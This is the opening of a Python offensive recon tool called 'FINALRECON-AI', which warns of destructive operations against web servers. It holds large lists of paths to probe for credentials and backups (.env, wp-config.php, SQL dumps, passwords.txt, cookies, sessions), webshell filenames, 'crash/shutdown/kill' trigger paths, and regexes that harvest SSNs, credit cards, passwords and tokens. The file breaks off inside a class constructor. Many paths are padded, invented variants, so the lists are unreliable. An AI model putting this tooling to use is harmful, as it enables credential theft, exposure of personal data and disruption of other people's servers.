#!/usr/bin/env python3
"""
FINALRECON-AI - WEB SERVER ONLY EDITION 2091.0
==============================================
Version: 2091.0 - Ultimate Complete Edition with OK Status
⚠️  WARNING: WEB SERVER ONLY - DESTRUCTIVE OPERATIONS!
⚠️  Use ONLY on YOUR OWN web server or AUTHORIZED targets!
⚠️  THIS IS FOR WEB SERVER ONLY - NOT FOR LOCAL COMPUTER!
"""

import os
import sys
import re
import json
import time
import gzip
import shutil
import socket
import ssl
import csv
import random
import ipaddress
import argparse
import datetime
import subprocess
import tempfile
import requests
import urllib3
from urllib import parse
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VERSION = "2091.0"
BUILD_NUMBER = "2091.000.1"

# ============================================
# COLOR CLASS
# ============================================
class Fore:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    OKGREEN = '\033[92m\033[1m'
    OKCYAN = '\033[96m\033[1m'
    OKYELLOW = '\033[93m\033[1m'
    DIM = '\033[2m'


# ============================================
# OK STATUS FUNCTIONS
# ============================================
def print_okay(message, item=""):
    if item:
        print(Fore.OKGREEN + f"[✓] OKAY: {message} - {item}" + Fore.RESET)
    else:
        print(Fore.OKGREEN + f"[✓] OKAY: {message}" + Fore.RESET)


def print_delete_okay(server, path):
    print(Fore.OKGREEN + f"[✓] OKAY - DELETED [{server}]: {path}" + Fore.RESET)


def print_delete_failed(server, path, error=""):
    if error:
        print(Fore.RED + f"[✗] FAILED - [{server}]: {path} - {error}" + Fore.RESET)
    else:
        print(Fore.RED + f"[✗] FAILED - [{server}]: {path}" + Fore.RESET)


def print_checking(server, path):
    print(Fore.CYAN + f"[*] CHECKING [{server}]: {path}" + Fore.RESET)


def print_suspicious(server, path, status):
    color = Fore.RED if status == 200 else Fore.YELLOW
    print(color + f"[!] SUSPICIOUS [{server}]: {path} ({status})" + Fore.RESET)


def print_progress(current, total, item=""):
    pct = int((current / total) * 100) if total > 0 else 0
    bar = "█" * int(pct / 2) + "░" * (50 - int(pct / 2))
    print(Fore.CYAN + f"\r[*] [{bar}] {pct}% ({current}/{total}) {item[:40]}" + Fore.RESET, end="")
    if current >= total:
        print()


# ============================================
# 2091 NEW: SERVER CONNECTION MAP
# ============================================
SERVER_CONNECTION_MAP = {
    'HTTP': {
        'port': 80,
        'protocol': 'http',
        'description': 'HTTP Web Server',
    },
    'HTTPS': {
        'port': 443,
        'protocol': 'https',
        'description': 'HTTPS Web Server',
    },
    'GWS': {
        'port': None,
        'protocol': 'http/https',
        'description': 'Google Web Server',
    },
    'ESF': {
        'port': 9200,
        'protocol': 'http',
        'description': 'Elasticsearch File Server',
    },
    'ANOTHER': {
        'port': None,
        'protocol': 'http/https',
        'description': 'Another Web Server',
    },
}

# ============================================
# ROCKYOU PATHS
# ============================================
ROCKYOU_PATHS = [
    '/usr/share/wordlists/rockyou.txt',
    '/usr/share/wordlists/rockyou.txt.gz',
    '/opt/wordlists/rockyou.txt',
    '/usr/share/seclists/Passwords/rockyou.txt',
    '~/rockyou.txt',
    './rockyou.txt',
    'rockyou.txt',
]

# ============================================
# PERSONAL INFORMATION PATTERNS
# ============================================
PERSONAL_INFO_PATTERNS = {
    'Full Name': [
        r'\b[A-Z][a-z]+\s+[A-Z][a-z]+\b',
        r'(?:name|fullname|full_name|firstname|lastname)["\']?\s*[:=]\s*["\']([A-Za-z\s]{3,50})["\']',
    ],
    'Email Address': [
        r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
    ],
    'Phone Number': [
        r'(?:\+\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}',
    ],
    'Address': [
        r'(?:address|addr|location)["\']?\s*[:=]\s*["\']([^"\']{10,200})["\']',
    ],
    'Date of Birth': [
        r'(?:dob|birth|birthday|date_of_birth)["\']?\s*[:=]\s*["\']([^"\']+)["\']',
    ],
    'SSN / National ID': [
        r'\b\d{3}-\d{2}-\d{4}\b',
    ],
    'Credit Card': [
        r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
    ],
    'Username': [
        r'(?:username|user_name|user|login)["\']?\s*[:=]\s*["\']([a-zA-Z0-9_.\-]{3,30})["\']',
    ],
    'Password Field': [
        r'(?:password|passwd|pwd|pass)["\']?\s*[:=]\s*["\']([^"\']{4,50})["\']',
    ],
    'API Token/Secret': [
        r'(?:secret|token|api_secret|private_key)["\']?\s*[:=]\s*["\']([a-zA-Z0-9\-_.]{16,})["\']',
    ],
}

# ============================================
# GATEWAY DETECTION
# ============================================
GATEWAY_INDICATORS = {
    'Default Gateway Headers': [
        'x-forwarded-for', 'x-forwarded-host', 'x-forwarded-proto',
        'x-real-ip', 'x-original-url', 'x-rewrite-url',
        'via', 'forwarded', 'x-gateway', 'x-proxy',
    ],
    'Load Balancer Headers': [
        'x-load-balancer', 'x-lb', 'x-alb', 'x-elb',
    ],
    'CDN Headers': [
        'cf-ray', 'cf-cache-status', 'x-cdn',
        'x-amz-cf-id', 'x-akamai', 'x-fastly',
    ],
    'Suspicious Gateway Paths': [
        '/gateway', '/proxy', '/forward', '/redirect',
        '/api/gateway', '/api/proxy', '/admin/gateway',
        '/cgi-bin/', '/.well-known/', '/actuator/',
        '/management/', '/env', '/trace', '/dump',
    ],
}

SUSPICIOUS_GATEWAY_SYSTEMS = {
    'Spring Boot Actuator': [
        '/actuator', '/actuator/health', '/actuator/env',
        '/actuator/beans', '/actuator/mappings',
    ],
    'Kong Gateway': [
        '/kong', '/status', '/metrics', '/services', '/routes',
    ],
    'Traefik Dashboard': [
        '/dashboard', '/api/rawdata', '/api/overview',
    ],
    'Nginx Status': [
        '/nginx_status', '/status', '/stub_status',
    ],
    'Apache Status': [
        '/server-status', '/server-info',
    ],
    'Docker API': [
        '/version', '/info', '/containers/json',
    ],
    'Kubernetes API': [
        '/api/v1/namespaces', '/api/v1/pods', '/healthz',
    ],
    'Prometheus': [
        '/metrics', '/prometheus', '/graph',
    ],
    'Grafana': [
        '/grafana', '/api/health', '/login',
    ],
    'Kibana': [
        '/kibana', '/app/kibana', '/api/status',
    ],
    'Elasticsearch': [
        '/_cluster/health', '/_cat/indices', '/_nodes',
    ],
}

# ============================================
# COMPLETE SERVER DATABASE
# ============================================
SERVER_SUSPICIOUS_DATABASE = {
    'HTTP': {
        'description': 'HTTP Server',
        'suspicious_paths': [
            '/http', '/http/', '/http/admin', '/http/config',
            '/http/data', '/http/logs', '/http/backup',
            '/http/session', '/http/upload', '/http/api',
            '/http/internal', '/http/private', '/http/secret',
            '/http/db', '/http/database', '/http/users',
            '/http/accounts', '/http/settings', '/http/system',
            '/http/status', '/http/health', '/http/debug',
            '/http/trace', '/http/env', '/http/test',
            '/http/old', '/http/new', '/http/temp',
            '/httpd.conf', '/apache2.conf', '/nginx.conf',
            '/etc/httpd/', '/etc/apache2/', '/etc/nginx/',
        ],
        'error_trigger_paths': [
            '/http/error', '/http/crash', '/http/shutdown',
            '/http/stop', '/http/kill', '/http/down',
            '/http/429', '/http/500', '/http/502',
            '/http/503', '/http/504',
        ],
        'account_action_paths': [
            '/http/account/action', '/http/account/verify',
            '/http/account/suspend', '/http/account/lock',
            '/http/account/block', '/http/user/action',
        ],
    },
    'HTTPS': {
        'description': 'HTTPS Server',
        'suspicious_paths': [
            '/https', '/https/', '/https/admin', '/https/config',
            '/https/data', '/https/logs', '/https/backup',
            '/https/session', '/https/upload', '/https/api',
            '/https/internal', '/https/private', '/https/secret',
            '/https/db', '/https/database', '/https/users',
            '/https/accounts', '/https/settings', '/https/system',
            '/https/status', '/https/health', '/https/debug',
            '/https/trace', '/https/env', '/https/test',
            '/https/old', '/https/new', '/https/temp',
            '/https/ssl', '/https/tls', '/https/certs',
            '/etc/ssl/', '/etc/pki/',
        ],
        'error_trigger_paths': [
            '/https/error', '/https/crash', '/https/shutdown',
            '/https/stop', '/https/kill', '/https/down',
            '/https/429', '/https/500', '/https/502',
            '/https/503', '/https/504',
        ],
        'account_action_paths': [
            '/https/account/action', '/https/account/verify',
            '/https/account/suspend', '/https/account/lock',
            '/https/account/block', '/https/user/action',
        ],
    },
    'GWS': {
        'description': 'Google Web Server',
        'suspicious_paths': [
            '/google', '/gws', '/google/', '/gws/',
            '/google/admin', '/gws/admin',
            '/google/config', '/gws/config',
            '/google/data', '/gws/data',
            '/google/logs', '/gws/logs',
            '/google/backup', '/gws/backup',
            '/google/session', '/gws/session',
            '/google/upload', '/gws/upload',
            '/google/api', '/gws/api',
            '/google/internal', '/gws/internal',
            '/google/private', '/gws/private',
            '/google/secret', '/gws/secret',
            '/google/db', '/gws/db',
            '/google/database', '/gws/database',
            '/google/users', '/gws/users',
            '/google/accounts', '/gws/accounts',
            '/google/settings', '/gws/settings',
            '/google/system', '/gws/system',
            '/google/status', '/gws/status',
            '/google/health', '/gws/health',
            '/google/debug', '/gws/debug',
            '/google/trace', '/gws/trace',
            '/google/env', '/gws/env',
            '/google/test', '/gws/test',
            '/google/old', '/gws/old',
            '/google/new', '/gws/new',
            '/google/temp', '/gws/temp',
            '/google/cache', '/gws/cache',
            '/google/storage', '/gws/storage',
            '/google/files', '/gws/files',
        ],
        'error_trigger_paths': [
            '/google/error', '/gws/error',
            '/google/crash', '/gws/crash',
            '/google/shutdown', '/gws/shutdown',
            '/google/stop', '/gws/stop',
            '/google/kill', '/gws/kill',
            '/google/down', '/gws/down',
            '/google/429', '/gws/429',
            '/google/500', '/gws/500',
        ],
        'account_action_paths': [
            '/google/account/action', '/gws/account/action',
            '/google/account/verify', '/gws/account/verify',
            '/google/account/suspend', '/gws/account/suspend',
            '/google/account/lock', '/gws/account/lock',
            '/google/user/action', '/gws/user/action',
        ],
    },
    'ESF': {
        'description': 'Elasticsearch File Server',
        'suspicious_paths': [
            '/elasticsearch', '/es', '/elastic',
            '/elasticsearch/', '/es/', '/elastic/',
            '/elasticsearch/admin', '/es/admin',
            '/elasticsearch/config', '/es/config',
            '/elasticsearch/data', '/es/data',
            '/elasticsearch/logs', '/es/logs',
            '/elasticsearch/backup', '/es/backup',
            '/elasticsearch/session', '/es/session',
            '/elasticsearch/upload', '/es/upload',
            '/elasticsearch/api', '/es/api',
            '/elasticsearch/internal', '/es/internal',
            '/elasticsearch/private', '/es/private',
            '/elasticsearch/secret', '/es/secret',
            '/elasticsearch/db', '/es/db',
            '/elasticsearch/database', '/es/database',
            '/elasticsearch/users', '/es/users',
            '/elasticsearch/accounts', '/es/accounts',
            '/elasticsearch/settings', '/es/settings',
            '/elasticsearch/system', '/es/system',
            '/elasticsearch/status', '/es/status',
            '/elasticsearch/health', '/es/health',
            '/elasticsearch/debug', '/es/debug',
            '/elasticsearch/trace', '/es/trace',
            '/elasticsearch/env', '/es/env',
            '/elasticsearch/test', '/es/test',
            '/elasticsearch/old', '/es/old',
            '/elasticsearch/new', '/es/new',
            '/elasticsearch/temp', '/es/temp',
            '/elasticsearch/cache', '/es/cache',
            '/elasticsearch/storage', '/es/storage',
            '/elasticsearch/files', '/es/files',
        ],
        'error_trigger_paths': [
            '/elasticsearch/error', '/es/error',
            '/elasticsearch/crash', '/es/crash',
            '/elasticsearch/shutdown', '/es/shutdown',
            '/elasticsearch/stop', '/es/stop',
            '/elasticsearch/kill', '/es/kill',
            '/elasticsearch/down', '/es/down',
            '/elasticsearch/429', '/es/429',
            '/elasticsearch/500', '/es/500',
        ],
        'account_action_paths': [
            '/elasticsearch/account/action', '/es/account/action',
            '/elasticsearch/account/verify', '/es/account/verify',
            '/elasticsearch/account/suspend', '/es/account/suspend',
            '/elasticsearch/account/lock', '/es/account/lock',
            '/elasticsearch/user/action', '/es/user/action',
        ],
    },
    'ANOTHER': {
        'description': 'Another Web Server',
        'suspicious_paths': [
            '/another', '/other', '/misc',
            '/another/', '/other/', '/misc/',
            '/another/admin', '/other/admin',
            '/another/config', '/other/config',
            '/another/data', '/other/data',
            '/another/logs', '/other/logs',
            '/another/backup', '/other/backup',
            '/another/session', '/other/session',
            '/another/upload', '/other/upload',
            '/another/api', '/other/api',
            '/another/internal', '/other/internal',
            '/another/private', '/other/private',
            '/another/secret', '/other/secret',
            '/another/db', '/other/db',
            '/another/database', '/other/database',
            '/another/users', '/other/users',
            '/another/accounts', '/other/accounts',
            '/another/settings', '/other/settings',
            '/another/system', '/other/system',
            '/another/status', '/other/status',
            '/another/health', '/other/health',
            '/another/debug', '/other/debug',
            '/another/trace', '/other/trace',
            '/another/env', '/other/env',
            '/another/test', '/other/test',
            '/another/old', '/other/old',
            '/another/new', '/other/new',
            '/another/temp', '/other/temp',
            '/another/cache', '/other/cache',
            '/another/storage', '/other/storage',
            '/another/files', '/other/files',
        ],
        'error_trigger_paths': [
            '/another/error', '/other/error',
            '/another/crash', '/other/crash',
            '/another/shutdown', '/other/shutdown',
            '/another/stop', '/other/stop',
            '/another/kill', '/other/kill',
            '/another/down', '/other/down',
            '/another/429', '/other/429',
            '/another/500', '/other/500',
        ],
        'account_action_paths': [
            '/another/account/action', '/other/account/action',
            '/another/account/verify', '/other/account/verify',
            '/another/account/suspend', '/other/account/suspend',
            '/another/account/lock', '/other/account/lock',
            '/another/user/action', '/other/user/action',
        ],
    },
}

# ============================================
# GWS DATA TARGETS
# ============================================
GWS_DATA_TARGETS = {
    'GWS Log Files': [
        '/var/log/google/access.log', '/var/log/google/error.log',
        '/var/log/gws/access.log', '/var/log/gws/error.log',
        '/logs/google/access.log', '/logs/gws/access.log',
        '/google/logs/', '/gws/logs/', '/google_access.log',
        '/gws_access.log', '/google_error.log', '/gws_error.log',
    ],
    'GWS Config Files': [
        '/etc/google/gws.conf', '/etc/gws/gws.conf',
        '/etc/google/config.json', '/etc/gws/config.json',
        '/google/config/', '/gws/config/', '/gws/settings/',
        '/google/settings/', '/.google/', '/.gws/',
    ],
    'GWS Cache Files': [
        '/var/cache/google/', '/var/cache/gws/',
        '/google/cache/', '/gws/cache/', '/cache/google/',
        '/cache/gws/', '/.google/cache/', '/.gws/cache/',
    ],
    'GWS Data Files': [
        '/google/data/', '/gws/data/', '/data/google/',
        '/data/gws/', '/google/db/', '/gws/db/',
        '/google/database/', '/gws/database/',
        '/google/data.db', '/gws/data.db', '/google.db', '/gws.db',
    ],
    'GWS Backup Files': [
        '/google/backup/', '/gws/backup/', '/backup/google/',
        '/backup/gws/', '/google_backup.zip', '/gws_backup.zip',
        '/google_backup.tar.gz', '/gws_backup.tar.gz',
        '/google.sql', '/gws.sql', '/google_dump.sql', '/gws_dump.sql',
    ],
    'GWS Old Data': [
        '/google/old/', '/gws/old/', '/old/google/', '/old/gws/',
        '/google/archive/', '/gws/archive/', '/google/legacy/',
        '/gws/legacy/', '/google_old/', '/gws_old/',
    ],
    'GWS New Data': [
        '/google/new/', '/gws/new/', '/new/google/', '/new/gws/',
        '/google/latest/', '/gws/latest/', '/google/current/',
        '/gws/current/', '/google_new/', '/gws_new/',
    ],
    'GWS Session Files': [
        '/var/lib/google/sessions/', '/var/lib/gws/sessions/',
        '/google/sessions/', '/gws/sessions/',
        '/tmp/google/', '/tmp/gws/', '/sessions/google/', '/sessions/gws/',
    ],
    'GWS Upload Directories': [
        '/google/uploads/', '/gws/uploads/', '/uploads/google/',
        '/uploads/gws/', '/google/files/', '/gws/files/',
        '/google/media/', '/gws/media/', '/google/images/', '/gws/images/',
    ],
    'GWS Text Files': [
        '/google/readme.txt', '/gws/readme.txt', '/google/notes.txt',
        '/gws/notes.txt', '/google/passwords.txt', '/gws/passwords.txt',
        '/google/users.txt', '/gws/users.txt', '/google/config.txt',
        '/gws/config.txt', '/google/data.txt', '/gws/data.txt',
    ],
    'GWS Cookies': [
        '/google/cookies.txt', '/gws/cookies.txt',
        '/google/cookies.json', '/gws/cookies.json',
        '/google/session.json', '/gws/session.json',
    ],
    'GWS Site Data': [
        '/google/site_data/', '/gws/site_data/',
        '/google/sitedata/', '/gws/sitedata/',
        '/google/storage/', '/gws/storage/',
        '/google/localstorage/', '/gws/localstorage/',
    ],
    'GWS Suspicious Data': [
        '/google/suspicious.txt', '/gws/suspicious.txt',
        '/google/malicious.txt', '/gws/malicious.txt',
        '/google/backdoor.txt', '/gws/backdoor.txt',
        '/google/shell.txt', '/gws/shell.txt',
        '/google/exploit.txt', '/gws/exploit.txt',
        '/google/payload.txt', '/gws/payload.txt',
    ],
}

# ============================================
# ESF DATA TARGETS
# ============================================
ESF_DATA_TARGETS = {
    'ESF Log Files': [
        '/var/log/elasticsearch/', '/var/log/es/', '/var/log/elastic/',
        '/logs/elasticsearch/', '/logs/es/', '/logs/elastic/',
        '/elasticsearch/logs/', '/es/logs/', '/elastic/logs/',
        '/elasticsearch.log', '/es.log', '/elastic.log',
    ],
    'ESF Config Files': [
        '/etc/elasticsearch/', '/etc/es/', '/etc/elastic/',
        '/elasticsearch/config/', '/es/config/', '/elastic/config/',
        '/elasticsearch.yml', '/es.yml', '/elastic.yml',
        '/elasticsearch.json', '/es.json', '/elastic.json',
    ],
    'ESF Data Files': [
        '/var/lib/elasticsearch/', '/var/lib/es/', '/var/lib/elastic/',
        '/elasticsearch/data/', '/es/data/', '/elastic/data/',
        '/elasticsearch/db/', '/es/db/', '/elastic/db/',
    ],
    'ESF Indices': [
        '/_cat/indices', '/_cluster/health', '/_nodes',
        '/_cat/nodes', '/_cat/shards', '/_cat/allocation',
        '/_cluster/stats', '/_nodes/stats', '/_stats',
        '/_search', '/_all', '/_mapping', '/_settings',
    ],
    'ESF Backup Files': [
        '/elasticsearch/backup/', '/es/backup/', '/elastic/backup/',
        '/backup/elasticsearch/', '/backup/es/', '/backup/elastic/',
        '/elasticsearch_backup.zip', '/es_backup.zip',
        '/elasticsearch.sql', '/es.sql', '/elasticsearch_dump.sql',
    ],
    'ESF Old Data': [
        '/elasticsearch/old/', '/es/old/', '/elastic/old/',
        '/old/elasticsearch/', '/old/es/', '/old/elastic/',
        '/elasticsearch/archive/', '/es/archive/', '/elastic/archive/',
    ],
    'ESF New Data': [
        '/elasticsearch/new/', '/es/new/', '/elastic/new/',
        '/new/elasticsearch/', '/new/es/', '/new/elastic/',
        '/elasticsearch/latest/', '/es/latest/', '/elastic/latest/',
    ],
    'ESF Cache Files': [
        '/var/cache/elasticsearch/', '/var/cache/es/', '/var/cache/elastic/',
        '/elasticsearch/cache/', '/es/cache/', '/elastic/cache/',
    ],
    'ESF Session Files': [
        '/var/lib/elasticsearch/sessions/', '/var/lib/es/sessions/',
        '/elasticsearch/sessions/', '/es/sessions/',
    ],
    'ESF Upload Directories': [
        '/elasticsearch/uploads/', '/es/uploads/', '/elastic/uploads/',
        '/uploads/elasticsearch/', '/uploads/es/', '/uploads/elastic/',
    ],
    'ESF Text Files': [
        '/elasticsearch/readme.txt', '/es/readme.txt', '/elastic/readme.txt',
        '/elasticsearch/notes.txt', '/es/notes.txt', '/elastic/notes.txt',
        '/elasticsearch/passwords.txt', '/es/passwords.txt',
    ],
    'ESF Cookies': [
        '/elasticsearch/cookies.txt', '/es/cookies.txt',
        '/elasticsearch/cookies.json', '/es/cookies.json',
        '/elasticsearch/session.json', '/es/session.json',
    ],
    'ESF Site Data': [
        '/elasticsearch/site_data/', '/es/site_data/',
        '/elasticsearch/sitedata/', '/es/sitedata/',
        '/elasticsearch/storage/', '/es/storage/',
    ],
    'ESF Suspicious Data': [
        '/elasticsearch/suspicious.txt', '/es/suspicious.txt',
        '/elasticsearch/malicious.txt', '/es/malicious.txt',
        '/elasticsearch/backdoor.txt', '/es/backdoor.txt',
        '/elasticsearch/shell.txt', '/es/shell.txt',
        '/elasticsearch/exploit.txt', '/es/exploit.txt',
        '/elasticsearch/payload.txt', '/es/payload.txt',
    ],
}

# ============================================
# WEB SERVER DATA TARGETS
# ============================================
WEB_SERVER_DATA_TARGETS = {
    'Backup Files': [
        '/backup.zip', '/backup.tar.gz', '/backup.tar', '/backup.rar',
        '/backup.sql', '/backup.sql.gz', '/backup.tar.bz2',
        '/site.zip', '/site.tar.gz', '/www.zip', '/html.zip',
        '/website.zip', '/website.tar.gz', '/web.zip',
        '/db.sql', '/database.sql', '/dump.sql', '/db_backup.sql',
        '/backup/', '/backups/', '/bak/', '/backup_old/',
    ],
    'Old Files': [
        '/old/', '/old_files/', '/old_version/', '/old_site/',
        '/previous/', '/archive/', '/archives/', '/historical/',
        '/.old/', '/legacy/', '/deprecated/',
        '/v1/', '/v1.0/', '/v2/', '/v2.0/', '/v3/',
    ],
    'New Data': [
        '/new/', '/latest/', '/current/', '/recent/',
        '/updated/', '/fresh/', '/modern/',
        '/v4/', '/v5/', '/v6/', '/v7/', '/v8/', '/v9/', '/v10/',
        '/2090/', '/2091/', '/2092/', '/2093/', '/2094/',
    ],
    'Log Files': [
        '/access.log', '/error.log', '/debug.log', '/app.log',
        '/application.log', '/server.log', '/nginx.log',
        '/apache.log', '/apache2.log', '/httpd.log',
        '/logs/', '/log/',
    ],
    'Config Files': [
        '/.env', '/.env.local', '/.env.production', '/.env.development',
        '/.env.backup', '/.env.old', '/.env.save', '/.env.bak',
        '/config.php', '/config.json', '/config.xml', '/config.yml',
        '/config.yaml', '/config.ini', '/config.conf',
        '/wp-config.php', '/configuration.php',
    ],
    'Cookies & Site Data': [
        '/cookies.txt', '/cookies.json', '/cookies.xml',
        '/session.txt', '/session.json', '/sessions.json',
        '/site_data/', '/sitedata/', '/site_data.json',
        '/localstorage/', '/local_storage/', '/localstorage.json',
        '/sessionstorage/', '/session_storage/',
        '/indexeddb/', '/indexed_db/', '/idb/',
        '/web_data/', '/webdata/', '/browser_data/',
    ],
    'Account Actions': [
        '/account_action', '/account/action', '/actions/required',
        '/action_required', '/account/verify', '/account/confirm',
        '/account/update', '/account/security', '/account/alert',
    ],
    'Error Trigger': [
        '/error_trigger', '/trigger_error', '/force_error',
        '/error/429', '/error/500', '/error/502', '/error/503',
        '/server_down', '/server_error', '/server_timeout',
    ],
    'Suspicious Data': [
        '/suspicious.txt', '/suspicious.json', '/suspicious.xml',
        '/malicious.txt', '/malicious.json', '/malicious.xml',
        '/backdoor.txt', '/backdoor.php', '/backdoor.jsp',
        '/shell.txt', '/shell.php', '/shell.jsp', '/shell.asp',
        '/webshell.txt', '/webshell.php', '/webshell.jsp',
        '/c99.txt', '/c99.php', '/r57.txt', '/r57.php',
        '/hack.txt', '/hack.php', '/hacked.txt', '/hacked.php',
    ],
}

# ============================================
# COMPLETE COOKIES & DATA TARGETS
# ============================================
COMPLETE_COOKIES_DATA_TARGETS = {
    'Cookies': [
        '/cookies.txt', '/cookies.json', '/cookies.xml', '/cookies.dat',
        '/cookie.txt', '/cookie.json', '/cookie.xml',
        '/cookies/', '/cookie/', '/.cookies/',
        '/cookies.sqlite', '/cookies.db',
        '/cookies.js', '/cookies.php', '/cookies.asp',
    ],
    'Sessions': [
        '/session.txt', '/session.json', '/sessions.json',
        '/session/', '/sessions/', '/.session/',
        '/session_data/', '/sessiondata/', '/session_id/',
        '/session.sqlite', '/session.db',
        '/sess/', '/sessid/', '/phpsessid/',
    ],
    'Site Data': [
        '/site_data/', '/sitedata/', '/site_data.json',
        '/site_data.xml', '/site_data.db', '/sitedata.json',
        '/site_data.sqlite', '/sitedata.db',
        '/sitedata/', '/site-data/', '/sitedata/',
        '/web_data/', '/webdata/', '/web_data.json',
    ],
    'Local Storage': [
        '/localstorage/', '/local_storage/', '/localstorage.json',
        '/localstorage.xml', '/local_storage.json',
        '/localstorage.sqlite', '/localstorage.db',
        '/local-storage/', '/localstorage.js',
    ],
    'Session Storage': [
        '/sessionstorage/', '/session_storage/', '/sessionstorage.json',
        '/sessionstorage.xml', '/session_storage.json',
        '/sessionstorage.sqlite', '/sessionstorage.db',
    ],
    'IndexedDB': [
        '/indexeddb/', '/indexed_db/', '/idb/', '/indexeddb.json',
        '/indexeddb.xml', '/indexeddb.sqlite', '/indexeddb.db',
    ],
    'Browser Data': [
        '/browser_data/', '/browserdata/', '/browser_data.json',
        '/browserdata.json', '/browser-data/',
        '/browser_data.sqlite', '/browserdata.db',
    ],
    'User Data': [
        '/user_data/', '/userdata/', '/user_data.json', '/userdata.json',
        '/user-data/', '/user_data.sqlite', '/userdata.db',
    ],
    'Profile Data': [
        '/profile_data/', '/profiledata/', '/profile.json',
        '/profile-data/', '/profile_data.json', '/profiledata.json',
    ],
    'App Data': [
        '/app_data/', '/appdata/', '/application_data/',
        '/app-data/', '/app_data.json', '/appdata.json',
    ],
    'Storage': [
        '/storage/', '/storage.json', '/storage.xml', '/storage.db',
        '/storage.sqlite', '/storage/', '/storage/',
        '/storage_data/', '/storagedata/', '/storage-data/',
    ],
    'Cache': [
        '/cache/', '/cache.json', '/cache.xml', '/cache.db',
        '/.cache/', '/cache_data/', '/cachedata/',
        '/cache.sqlite', '/cachedata.db',
    ],
    'Temp Files': [
        '/tmp/', '/temp/', '/.tmp/', '/.temp/',
        '/tmp/cache/', '/temp/cache/', '/tmp/data/',
    ],
}

# ============================================
# PHISHING PATTERNS
# ============================================
PHISHING_PATTERNS = {
    'Fake Login Form': [
        r'<form[^>]*action=["\'][^"\']*login[^"\']*["\']',
        r'<input[^>]*type=["\']password["\']',
    ],
    'Credential Harvesting': [
        r'<input[^>]*name=["\']username["\']',
        r'<input[^>]*name=["\']email["\']',
    ],
}

CONFIG = {
    'timeout': 10,
    'export_dir': 'finalrecon-ai-results',
}

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
                993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8000, 8888, 9000,
                9090, 10000, 27017, 6379, 9200, 5601, 3000, 5000, 9001]

COMMON_SUBDOMAINS = [
    'www', 'mail', 'ftp', 'webmail', 'smtp', 'pop', 'ns1', 'ns2', 'cpanel',
    'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test', 'ns', 'blog',
    'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3', 'mail2',
]

DEFAULT_WORDLIST = [
    'admin', 'login', 'wp-admin', 'administrator', 'backup', 'backups',
    'config', 'configs', 'db', 'database', 'sql', 'test', 'tests',
    'dev', 'development', 'staging', 'prod', 'production', 'api',
]


# ============================================
# SAFE FILE OPERATIONS
# ============================================
def safe_makedirs(path):
    try:
        if path and not os.path.exists(path):
            os.makedirs(path, exist_ok=True)
        return True
    except Exception:
        return False


def safe_write_file(path, content):
    try:
        dir_name = os.path.dirname(path)
        if dir_name:
            safe_makedirs(dir_name)
        with open(path, 'w') as f:
            f.write(content)
        return True
    except Exception:
        return False


def safe_read_file(path):
    try:
        if not os.path.exists(path):
            return None
        with open(path, 'r', errors='ignore') as f:
            return f.read()
    except Exception:
        return None


def read_wordlist_streaming(path, max_lines=10000):
    words = []
    try:
        with open(path, 'r', errors='ignore') as f:
            for i, line in enumerate(f):
                if i >= max_lines:
                    break
                line = line.strip()
                if line and not line.startswith('#'):
                    words.append(line)
    except Exception:
        pass
    return words


# ============================================
# ROCKYOU FINDER
# ============================================
def find_rockyou():
    print(Fore.CYAN + "\n" + "=" * 60)
    print(Fore.CYAN + "[*] ROCKYOU WORDLIST FINDER")
    print(Fore.CYAN + "=" * 60)

    for path in ROCKYOU_PATHS:
        expanded = os.path.expanduser(path)

        if os.path.exists(expanded):
            if expanded.endswith('.gz'):
                print(Fore.YELLOW + f"[!] Found compressed: {expanded}")
                try:
                    tmp_path = os.path.join(tempfile.gettempdir(), 'rockyou_decompressed.txt')
                    with gzip.open(expanded, 'rb') as f_in:
                        with open(tmp_path, 'wb') as f_out:
                            shutil.copyfileobj(f_in, f_out)
                    print_okay("RockYou decompressed", tmp_path)
                    return tmp_path
                except Exception as e:
                    print(Fore.RED + f"[-] Decompress error: {e}")
                    continue

            if os.access(expanded, os.R_OK):
                size = os.path.getsize(expanded)
                size_mb = round(size / (1024 * 1024), 2)
                print_okay("RockYou found", f"{expanded} ({size_mb} MB)")
                return expanded

    print(Fore.RED + "\n[!] rockyou.txt NOT FOUND")
    print(Fore.CYAN + "=" * 60 + "\n")
    return None


def validate_wordlist_path(path):
    if not path:
        return None
    if path.lower() in ['rockyou', 'rockyou.txt']:
        return find_rockyou()
    if os.path.exists(path):
        if os.path.isfile(path) and os.access(path, os.R_OK):
            return path
    dir_name = os.path.dirname(path)
    if dir_name and not os.path.exists(dir_name):
        safe_makedirs(dir_name)
    if safe_write_file(path, '\n'.join(DEFAULT_WORDLIST)):
        return path
    try:
        tmp_path = os.path.join(tempfile.gettempdir(), 'finalrecon_wordlist.txt')
        if safe_write_file(tmp_path, '\n'.join(DEFAULT_WORDLIST)):
            return tmp_path
    except Exception:
        pass
    return None


# ============================================
# MAIN CLASS
# ============================================
class AutonomousAIRobot:
    def __init__(self, target=None, args=None):
        self.target = target
        self.args = args
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
        })

        self.subdomains_found = []
        self.open_ports = []
        self.directories_found = []
        self.emails = []
        self.dns_info = {}
        self.whois_info = {}
        self.ssl_info = {}
        self.headers_info = {}
        self.isp_info = {}
        self.crawled_urls = []
        self.vulnerabilities = []
        self.wordlist_source = None
        self.phishing_findings = []
        self.phishing_score = 0
        self.cookie_keys = []
        self.rate_limit_429 = False

        # Personal Info
        self.personal_info = []
        self.personal_info_score = 0
        self.gateway_info = {}
        self.gateway_suspicious_systems = []
        self.gateway_destroyed = []
        self.data_cleaned = []
        self.data_cleaner_findings = []
